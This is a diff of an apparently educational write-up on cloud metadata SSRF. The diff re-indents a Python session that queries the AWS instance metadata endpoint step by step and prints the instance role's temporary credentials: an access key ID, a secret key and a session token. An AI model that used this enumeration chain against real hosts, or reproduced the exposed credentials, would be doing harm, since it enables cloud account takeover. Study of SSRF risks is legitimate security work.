@@ -57,106 +57,104 @@ MAC-Address: 12:78:85:2e:e2:9b
 
 #### Now let's start navigating the vulnerability with our python interpreter on that AWS Instance:
 
-[ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ python
-Python 2.7.16 (default, Feb 10 2020, 18:54:57) 
-[GCC 4.8.5 20150623 (Red Hat 4.8.5-28)] on linux2
-Type "help", "copyright", "credits" or "license" for more information.
->>> import requests
->>> print requests.get("http://169.254.169.254/").text
-1.0
-2007-01-19
-2007-03-01
-2007-08-29
-2007-10-10
-2007-12-15
-2008-02-01
-2008-09-01
-2009-04-04
-2011-01-01
-2011-05-01
-2012-01-12
-2014-02-25
-2014-11-05
-2015-10-20
-2016-04-19
-2016-06-30
-2016-09-02
-2018-03-28
-2018-08-17
-2018-09-24
-2019-10-01
-latest
->>> print requests.get("http://169.254.169.254/latest").text
-dynamic
-meta-data
-user-data
->>> print requests.get("http://169.254.169.254/latest/meta-data").text
-ami-id
-ami-launch-index
-ami-manifest-path
-block-device-mapping/
-events/
-hostname
-identity-credentials/
-instance-action
-instance-id
-instance-type
-local-hostname
-local-ipv4
-mac
-metrics/
-network/
-placement/
-profile
-public-hostname
-public-ipv4
-public-keys/
-reservation-id
-security-groups
-services/
->>> print requests.get("http://169.254.169.254/latest/meta-data/security-groups").text
-launch-wizard-1
->>> print requests.get("http://169.254.169.254/latest/meta-data/").text               
-ami-id
-ami-launch-index
-ami-manifest-path
-block-device-mapping/
-events/
-hostname
-identity-credentials/
-instance-action
-instance-id
-instance-type
-local-hostname
-local-ipv4
-mac
-metrics/
-network/
-placement/
-profile
-public-hostname
-public-ipv4
-public-keys/
-reservation-id
-security-groups
-services/
->>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials").text
-ec2/
->>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials/ec2").text
-info
-security-credentials/
->>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials").text
-ec2-instance
->>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance").text
-{
-  "Code" : "Success",
-  "LastUpdated" : "2020-05-07T22:09:26Z",
-  "Type" : "AWS-HMAC",
-  "AccessKeyId" : "ASIA5ZL6OWN43E322SVZ",
-  "SecretAccessKey" : "bvh4SjWKLx9C0vXvgbo0bmxAu86+p7MJpyb8kP7A",
-  "Token" : "IQoJb3JpZ2luX2VjEI///////////wEaCXVzLWVhc3QtMSJHMEUCIQCRiuYS8eyOfp8JuflJAFCKmBUqVa7cHRNDpJE9THqCZgIgXoY1xStydT3cvZ2tiYTPRZ0qS3gVPjnYYpfl/NoLY6EqyAMIx///////////ARAAGgw5NDc4NDIzNjQyODEiDG2Nwf/d+DcGABtZICqcAwuvGVOdhe9H8KCRh/wcDj436oft81PEcloEvyPFPKIYc+k4zeECnbm+ODX7CFrMYpx9KBQmgScQqnfWFIAujsCDtStpsfPDpnYNngd53uWk+HzC3jVMj1tBf2pqYqgnHP7Flceu+PQHQ5OVBIECj8BOXq92r1s/bKK8IDH/X1udm0DPrTB5C8HZJnc2wTzbSB2s9VPzZHXaRvqezX2Z08s2hVqHitzpcL55uldDzevzfh0gcVs1e/GHgnpjyFixPstrLH3sZ9QDEg9oK7B90pbvQ1TsZBiUV25usRBq2lPylgyposo1+cCgwI9KtT+Kyftj0KvYCXS547nInlBUmfv7J67dxeTzqpbinv8hjc0VF4RYyKRmgOYQr/JMi6gjkULJJ/p2almI7L1F3UOB9HD4rXnCevrbRkZI3azpLeR45dhybDG/KKl9d+f1EVV05ND0j7Up03u8HxFiLWngyaDgrhJ/wnHCbMimXVv025DK6MFsL7C3vEsJh2+li00wJIslMGGjW6wVoCPgxvjEaOdUeWpRz3IVu6eU0yQwoY7S9QU65wEc7564BMrDU/Qm+4ZVmcCYeQmhAb4GBQRQKWRaD3itCsYFnf+4CAi9f0zzWp3i4rJBuh8aByGEcQW+aL24QzWD+5Kc+1XsJWZprqf5a695Wjt5RaCc1unmQHCfyYXVTIurqXwwNqRbBBc+4VnOdmYTuiNh+T1U68vzP/jufAWhAQ2NDgXV5kCpl/MAKFGTGJ8PMRsaebRIgIEhefQiQ9qlNa/sYWqsD3Z04NJL+LxG08QVPGkhRtF7xL8qmXavHivl2hwf1xmjPEymFIeEm7cbFBhZVAFD02F57v63EHW1j1aVp++gob4=",
-  "Expiration" : "2020-05-08T04:44:10Z"
-}
+	[ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ python
+	Python 2.7.16 (default, Feb 10 2020, 18:54:57) 
+	[GCC 4.8.5 20150623 (Red Hat 4.8.5-28)] on linux2
+	Type "help", "copyright", "credits" or "license" for more information.
+	>>> import requests
+	>>> print requests.get("http://169.254.169.254/").text
+	1.0
+	2007-01-19
+	2007-03-01
+	2007-08-29
+	2007-10-10
+	2007-12-15
+	2008-02-01
+	2008-09-01
+	2009-04-04
+	2011-01-01
+	2011-05-01
+	2012-01-12
+	2014-02-25
+	2014-11-05
+	2015-10-20
+	2016-04-19
+	2016-06-30
+	2016-09-02
+	2018-03-28
+	2018-08-17
+	2018-09-24
+	2019-10-01
+	latest
+	>>> print requests.get("http://169.254.169.254/latest").text
+		dynamic
+		meta-data
+		user-data
+	>>> print requests.get("http://169.254.169.254/latest/meta-data").text
+		ami-id
+		ami-launch-index
+		ami-manifest-path
+		block-device-mapping/
+		events/
+		hostname
+		identity-credentials/
+		instance-action
+		instance-id
+		instance-type
+		local-hostname
+		local-ipv4
+		mac
+		metrics/
+		network/
+		placement/
+		profile
+		public-hostname
+		public-ipv4
+		public-keys/
+		reservation-id
+		security-groups
+		services/
+	>>> print requests.get("http://169.254.169.254/latest/meta-data/").text               
+		ami-id
+		ami-launch-index
+		ami-manifest-path
+		block-device-mapping/
+		events/
+		hostname
+		identity-credentials/
+		instance-action
+		instance-id
+		instance-type
+		local-hostname
+		local-ipv4
+		mac
+		metrics/
+		network/
+		placement/
+		profile
+		public-hostname
+		public-ipv4
+		public-keys/
+		reservation-id
+		security-groups
+		services/
+	>>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials").text
+		ec2/
+	>>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials/ec2").text
+		info
+		security-credentials/
+	>>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials").text
+		ec2-instance
+	>>> print requests.get("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance").text
+		{
+		  "Code" : "Success",
+		  "LastUpdated" : "2020-05-07T22:09:26Z",
+		  "Type" : "AWS-HMAC",
+		  "AccessKeyId" : "ASIA5ZL6OWN43E322SVZ",
+		  "SecretAccessKey" : "bvh4SjWKLx9C0vXvgbo0bmxAu86+p7MJpyb8kP7A",
+		  "Token" : "IQoJb3JpZ2luX2VjEI///////////wEaCXVzLWVhc3QtMSJHMEUCIQCRiuYS8eyOfp8JuflJAFCKmBUqVa7cHRNDpJE9THqCZgIgXoY1xStydT3cvZ2tiYTPRZ0qS3gVPjnYYpfl/NoLY6EqyAMIx///////////ARAAGgw5NDc4NDIzNjQyODEiDG2Nwf/d+DcGABtZICqcAwuvGVOdhe9H8KCRh/wcDj436oft81PEcloEvyPFPKIYc+k4zeECnbm+ODX7CFrMYpx9KBQmgScQqnfWFIAujsCDtStpsfPDpnYNngd53uWk+HzC3jVMj1tBf2pqYqgnHP7Flceu+PQHQ5OVBIECj8BOXq92r1s/bKK8IDH/X1udm0DPrTB5C8HZJnc2wTzbSB2s9VPzZHXaRvqezX2Z08s2hVqHitzpcL55uldDzevzfh0gcVs1e/GHgnpjyFixPstrLH3sZ9QDEg9oK7B90pbvQ1TsZBiUV25usRBq2lPylgyposo1+cCgwI9KtT+Kyftj0KvYCXS547nInlBUmfv7J67dxeTzqpbinv8hjc0VF4RYyKRmgOYQr/JMi6gjkULJJ/p2almI7L1F3UOB9HD4rXnCevrbRkZI3azpLeR45dhybDG/KKl9d+f1EVV05ND0j7Up03u8HxFiLWngyaDgrhJ/wnHCbMimXVv025DK6MFsL7C3vEsJh2+li00wJIslMGGjW6wVoCPgxvjEaOdUeWpRz3IVu6eU0yQwoY7S9QU65wEc7564BMrDU/Qm+4ZVmcCYeQmhAb4GBQRQKWRaD3itCsYFnf+4CAi9f0zzWp3i4rJBuh8aByGEcQW+aL24QzWD+5Kc+1XsJWZprqf5a695Wjt5RaCc1unmQHCfyYXVTIurqXwwNqRbBBc+4VnOdmYTuiNh+T1U68vzP/jufAWhAQ2NDgXV5kCpl/MAKFGTGJ8PMRsaebRIgIEhefQiQ9qlNa/sYWqsD3Z04NJL+LxG08QVPGkhRtF7xL8qmXavHivl2hwf1xmjPEymFIeEm7cbFBhZVAFD02F57v63EHW1j1aVp++gob4=",
+		  "Expiration" : "2020-05-08T04:44:10Z"
+		}
 >>> 
 
 ### And look at that, a secret access token - can we do this through the SSRF?
